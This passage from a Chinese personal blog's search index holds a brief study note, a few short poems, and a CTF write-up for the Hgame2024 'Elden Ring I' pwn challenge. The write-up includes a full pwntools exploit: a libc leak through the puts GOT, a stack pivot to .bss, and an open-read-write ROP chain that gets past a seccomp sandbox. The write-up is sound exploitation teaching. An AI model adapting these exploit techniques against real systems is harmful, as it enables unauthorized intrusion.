+<p>第一次写学习笔记的博客，本来是希望一边复习一边能写成猴子都能看懂的，，最起码让能看到这篇的友友不要和我当初一样苦，但是自己写了才知道原来互联网上那么多垃圾不是没由来的，我也好拉，感觉那些真正有用的东西想要清晰的、实用的写出来确实很难。。<br>但是也很幸运的在网上挖到宝了，尽管停更于2020年。<br>之后博客的工作要暂停一阵子了，最近没有时间写了，今天组会就开了超级久，但是感觉都是些没劲的东西。<br>还有一个原因是组会的老师让我们看2023年之后的论文，但是我现在写的东西可能连05年的进度都还没到。。<br>不过AI本身就和他的算法一样，是迭代的技术啦，就是有的老东西一直留下来，而有的被更替。<br>所以我觉得可能我对前沿的了解多一点之后，会更有写blog的重点。而且对我来说写blog也算放松的一种啦，只是最近没时间放松。(☍﹏⁰。)</p>
+<p>┌|◎o◎|┘好像没啥要说了 大物 期中 救救</p>
+<h2 id="我只会瞎jb乱按"><a href="#我只会瞎jb乱按" class="headerlink" title="我只会瞎jb乱按"></a>我只会瞎jb乱按</h2><p><code>date: 2024-04-20 22:53:39</code></p>
+<p>(´Ａ｀。)</p>
+<p>内容被作者撤回啦，可公开的情报：</p>
+<p>想重新学python，，；<br>C不会了，，；<br>web知识为0；<br>因为不喜欢AI所以对pwn念念不忘，其实CV和机器学习这两块在我大脑里结合的不是很好；<br>谴责<strong>臭狗</strong>不会好好看我的博客；</p>
+]]></content>
+      <tags>
+        <tag>喵喵</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记录一次栈迁移|Hgame2024-Elden Ring I</title>
+    <url>/2024/05/24/%E6%87%92%E5%BE%97%E5%96%B7/</url>
+    <content><![CDATA[<p>( ºΔº )</p>
+<p>很有意义的一次做题，尤其对我这种。。</p>
+<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>按照流程应该先看一下保护和文件信息，但是因为我是知道答案找过程所以就略过。</p>
+<p>然后看ida,找一下洞<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/pic/eldenring1/1.png"
+                      alt="img.png"
+                ><br>看到开了沙箱，禁用了一些系统调用<br>然后进函数看<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/pic/eldenring1/2.png"
+                      alt="img.png"
+                ><br>申请了100h空间写东西，但是允许你写130h，非常清楚的栈溢出，给了30h的操作空间</p>
+<p>所以大概思路就是要用orw这样也能读到flag,然后30h写不下,所以需要一块可写的地方，还有足够的长度和写的指令。</p>
+<p>看到vuln里面有read(),所以写的指令可以直接借这个。放orx的地方就选择可读可写的bss段，那么就要栈迁移一下。</p>
+<p>好，那么exp的思路应该是：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">第一次leave ret：溢出一下，改变rbp旧址，移动栈底，把read()的写入地址改成bss,回到read()</span><br><span class="line">第二次leave ret：借read（）把orw写进新的栈之后会经过leave ret,然后自然而然rsp找rbp,ret到栈顶。</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
+<p>新的栈相当于全部都是可以利用的，所以基本不担心写不写得下orw。<br>然后来看需要的地址(除了ida能找到的和pwntools可以直接读到的)和代码片段：</p>
+<ul>
+<li>pop_rax_ret</li>
+<li>pop_rdi_ret</li>
+<li>pop_rsi_ret</li>
+<li>pop_rdx_ret</li>
+<li>open_addr</li>
+<li>read_addr</li>
+<li>write_addr</li>
+</ul>
+<p>然后去找了一下代码片段<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/pic/eldenring1/3.png"
+                      alt="img.png"
+                ><br>啊这根本不够用，而且知道open_addr也需要libc基址<br>所以显然再加一步泄露libc基址，啊因为这个题还是比较温柔的，vuln里一共就一个puts(),一个read(),很明显这个用过的puts()可以拿来got表泄露一下。<br>我们已经能够控制rdi了，30h也足够把puts()泄露了</p>
+<p>所以payload的思路就是：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一次read:溢出泄露puts()拿到puts()的物理地址，回到函数</span><br><span class="line">    然后减去偏移泄露libc,算一下需要的地址，以及代码片段的位置</span><br><span class="line">第二次read:溢出改变rbp旧址，控制rax,回到read（）</span><br><span class="line">第三次read:写入orw</span><br></pre></td></tr></table></figure></div>
+<p>好的下面是exp</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#纯本地打的一次</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line"></span><br><span class="line">p=process(&quot;./vuln&quot;)</span><br><span class="line">elf=ELF(&quot;./vuln&quot;)</span><br><span class="line">libc=ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">##ida里直接找的</span><br><span class="line">ret_add=0x40125B</span><br><span class="line">bss_add=0x404090</span><br><span class="line">##ROPgadget</span><br><span class="line">pop_rdi_ret=0x4013e3</span><br><span class="line"></span><br><span class="line">#第一次read</span><br><span class="line">payload=(0x108)*b&#x27;A&#x27;+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(ret_add)</span><br><span class="line">payload=payload.ljust(0x130,b&#x27;\x00&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendafter(&quot;accord.&quot;,payload)      </span><br><span class="line">p.recvline()    </span><br><span class="line">p.recvline()  </span><br><span class="line"></span><br><span class="line">#算基址                              </span><br><span class="line">puts_add=u64(p.recvline()[:6].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">libc_base=puts_add-0x84420  ##0x84420是puts在libc里的偏移，这个东西有两种来法，写在后面力</span><br><span class="line">print(&quot;libc_base=&quot;,hex(libc_base),&quot;puts_add=&quot;,hex(puts_add))</span><br><span class="line"></span><br><span class="line">#算需要的地址</span><br><span class="line">pop_rax_ret=0x0000000000036174+libc_base</span><br><span class="line">pop_rsi_ret=0x000000000002601f+libc_base</span><br><span class="line">pop_rdx_ret=0x0000000000142c92+libc_base</span><br><span class="line">open_add=libc_base+libc.sym[&quot;open&quot;]</span><br><span class="line">read_add=libc_base+libc.sym[&quot;read&quot;]</span><br><span class="line">write_add=libc_base+libc.sym[&quot;write&quot;]</span><br><span class="line"></span><br><span class="line">#第二次read</span><br><span class="line">payload=0x100*b&#x27;a&#x27;</span><br><span class="line">payload+=p64(bss_add-0x8)##rbp</span><br><span class="line">payload+=p64(pop_rax_ret)</span><br><span class="line">payload+=p64(bss_add)</span><br><span class="line">payload+=p64(0x401282)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.sendafter(&quot;accord.&quot;,payload)</span><br><span class="line"></span><br><span class="line">#第三次read</span><br><span class="line">#orw 从0x404090开始</span><br><span class="line">payload1=p64(pop_rdi_ret)</span><br><span class="line">payload1+=p64(0x404128)</span><br><span class="line">payload1+=p64(pop_rsi_ret)</span><br><span class="line">payload1+=p64(0)</span><br><span class="line">payload1+=p64(open_add)</span><br><span class="line"></span><br><span class="line">payload1+=p64(pop_rdi_ret)</span><br><span class="line">payload1+=p64(3)</span><br><span class="line">payload1+=p64(pop_rsi_ret)</span><br><span class="line">payload1+=p64(0x404140) ##0x404128+hex(16)=0x404138</span><br><span class="line">payload1+=p64(pop_rdx_ret)</span><br><span class="line">payload1+=p64(0x100)</span><br><span class="line">payload1+=p64(read_add)</span><br><span class="line"></span><br><span class="line">payload1+=p64(pop_rdi_ret)</span><br><span class="line">payload1+=p64(1)</span><br><span class="line">payload1+=p64(pop_rsi_ret)</span><br><span class="line">payload1+=p64(0x404140)</span><br><span class="line">payload1+=p64(pop_rdx_ret)</span><br><span class="line">payload1+=p64(0x100)</span><br><span class="line">payload1+=p64(write_add)</span><br><span class="line">payload1+=b&#x27;flag\x00\x00\x00\x00&#x27;#0x404090+hex(19*8)=0x404128</span><br><span class="line">payload1+= p64(0)*16</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+<h3 id="一些问题复现与小知识"><a href="#一些问题复现与小知识" class="headerlink" title="一些问题复现与小知识"></a>一些问题复现与小知识</h3><h4 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h4><p>个人理解就是栈顶找栈底，然后把栈底的旧址改了就能把栈迁移走。</p>
+<p>那么第一次leave ret就是栈顶回到没有申请栈的时候，栈底移走<br>第二次leave ret就是栈顶到了新栈底的地方，控制流就跟着栈顶走了</p>
+<h6 id="迁移到了哪？0x404090"><a href="#迁移到了哪？0x404090" class="headerlink" title="迁移到了哪？0x404090"></a>迁移到了哪？0x404090</h6><p>原计划是要迁移到bss段，但是我看到ida上bss的开始其实还要更早<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/pic/eldenring1/4.png"
+                      alt="img.png"
+                ><br>而实际写进去的位置大概在prgend这里，呃呃查了一些资料感受不出来这俩有啥要可以区分的<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/pic/eldenring1/5.png"
+                      alt="img_1.png"
+                ><br>总之直接开调，先去vmmap里面只能看到数据段是从0x404000到0x405000很大一段<br>然后ida也能看到bss的起始地址，就试了一下把bss_add写得再小一点，是可以打通的</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">bss_add=0x404068</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">#orw 0x404090</span><br><span class="line">payload1=p64(pop_rdi_ret)</span><br><span class="line">payload1+=p64(0x404100)</span><br><span class="line">payload1+=p64(pop_rsi_ret)</span><br><span class="line">payload1+=p64(0)</span><br><span class="line">payload1+=p64(open_add)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">payload1+=p64(0x404108)</span><br><span class="line">payload1+=p64(pop_rdx_ret)</span><br><span class="line">payload1+=p64(0x100)</span><br><span class="line">payload1+=p64(read_add)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">payload1+=p64(0x404108)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
+<p>后来我又试了一下把orw写到data（0x404050开始）上在这个题目里也是可以打通的，不过再往前和got.plt（0x404000）开始就不ok了，应该是影响到了函数调用（？</p>
+<h4 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h4><p>这个东西之前接触过，但是和这次的调用逻辑不太一样，，，但是函数传参那套还是在的<br>emmm主要调试了一下这个第二个参数传的地址的变化，open要开的是’flag‘的地址，就是[add]&#x3D;’flag’,第一遍打通的时候其实没找准，主要是因为我用的最后一个gadget和参考的exp不一样长，然后填充长度也就不一样了。</p>
+<p>所以后来改了一下，然后把计算过程写在前面的exp里了，也用<code>tele</code>调试了几种不同的情况。</p>
+<h4 id="recv"><a href="#recv" class="headerlink" title="recv()"></a>recv()</h4><p>这个东西从我第一次打pwn到现在都在出问题（乐<br>首先这次是因为这个狗题puts(“…\n”)<br>然后recvline(keepends&#x3D;True)默认接收换行符，且是接收到换行符结束<br>recvuntil(delims, drop&#x3D;False),delims是字符串，drop表示是否丢弃中止标志<br>recv()接收指定字符长度</p>
+<h4 id="offset"><a href="#offset" class="headerlink" title="offset"></a>offset</h4><h6 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h6><p>这个相对libc的偏移是固定的，只是libc的基址会变，所以可以取一次调试得到的装载后的地址<code>puts_add</code>-这一次的基址就是每一次的偏移。<br>这个x指令我不是很会用，就用p凑合凑合了<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/pic/eldenring1/6.png"
+                      alt="img_2.png"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/pic/eldenring1/7.png"
+                      alt="img_3.png"
+                ><br>然后十进制转一下十六进制。。</p>
+<h6 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h6><p>但是我本来就在想，既然偏移是固定的，那pwntools为什么不能直接解析文件呢。<br>而且本来脚本就有：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">open_add=libc_base+libc.sym[&quot;open&quot;]</span><br><span class="line">read_add=libc_base+libc.sym[&quot;read&quot;]</span><br><span class="line">write_add=libc_base+libc.sym[&quot;write&quot;]</span><br></pre></td></tr></table></figure></div>
+<p>这种东西，他们的偏移不就直接得出来。<br>然后我就试了一下这个</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(hex(libc.sym[&#x27;puts&#x27;]))</span><br></pre></td></tr></table></figure></div>
+<p>返回0x84420，所以其实这玩意确实不用算。。</p>
+<h4 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h4><p>装了一个工具，解决我只能硬看的问题</p>
+<h4 id="一些其他小问题"><a href="#一些其他小问题" class="headerlink" title="一些其他小问题"></a>一些其他小问题</h4><p>调到这里大部分问题都没有了，比较可惜的是其实没有机会复现寒假出现的问题了，可能确实那个时候就是环境一开始因为各种问题就是配的烂，所以有很多莫名其妙的东西出现，现在这个环境是我五一的时候重装的，这一次从头到尾都配很丝滑，所以好像也没有换glibc,patchelf有问题等一系列的毛病。</p>
+<p>希望能早点做到一个需要换环境的题，因为这个我真不会。</p>
+<h3 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h3><p>动态调试其实最重要的是我现在能理解到ret和pop了，之前不知道为什么就是对这两条指令的接收度不高，所以有些问题感觉都是好像懂了好像没懂。也可能是因为虽然代码写得多，但其实没怎么在实践中接触栈，对于栈顶的理解也不够深刻maybe.</p>
+]]></content>
+      <tags>
+        <tag>学习日志</tag>
+        <tag>Pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>不定时更新小诗</title>
+    <url>/2024/05/13/%E7%99%BD%E9%B8%9F%E8%BF%87%E6%B2%B3%E6%BB%A9/</url>
+    <content><![CDATA[<p><em>_φ</em>_(．．)</p>
+<h4 id="五月十一日深夜记"><a href="#五月十一日深夜记" class="headerlink" title="五月十一日深夜记"></a>五月十一日深夜记</h4><blockquote>
+<p>翻山过重嶂，步步惊梦。循声暗道，踏花零落木叠叠。</p>
+<p>浮云比肩绕，魂系高阁。高阁空算，昔时海棠钗雪，灭。</p>
+</blockquote>
+<p><em>想了想把之前还能找到的也po上来，也算是备份吧</em></p>
+<h4 id="无题"><a href="#无题" class="headerlink" title="无题"></a>无题</h4><p><em>（写于二月十六日）</em>  </p>
+<blockquote>
+<p>旧故曲调重唱，莫怪多情烦扰。可怜辩白寥寥，争先抢高。天朗气清春日早，只叹小屋地偏少见光。借我酒一杯，慢叙愁百千。心事墨池留，魂浪天涯乡。</p>
+</blockquote>
+<h4 id="今夜月升影重重"><a href="#今夜月升影重重" class="headerlink" title="今夜月升影重重"></a>今夜月升影重重</h4><p><em>（写于六月五日）</em></p>
+<blockquote>
+<p>今夜月升影重重，风飘树摇兴阑珊。<br>小山无言醉晚意，明朝梦醒两相忘。</p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>白鸟</tag>
+      </tags>
+  </entry>
+</search>
